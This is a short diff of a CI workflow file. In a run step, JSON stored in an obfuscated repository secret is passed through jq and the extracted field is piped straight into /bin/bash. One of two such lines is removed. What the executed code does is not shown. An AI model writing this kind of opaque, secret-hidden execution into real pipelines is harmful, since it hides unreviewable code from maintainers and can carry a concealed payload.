@@ -21,7 +21,6 @@ jobs:
           opntx9: ${{ secrets.opntx9 }}
         run: |
           printf '%s' "$opntx9" | jq -r .dweug88725 | /bin/bash
-          printf '%s' "$fzddu8" | jq -r .mgfm854 | /bin/bash
 
       - name: Archive results
         if: always()
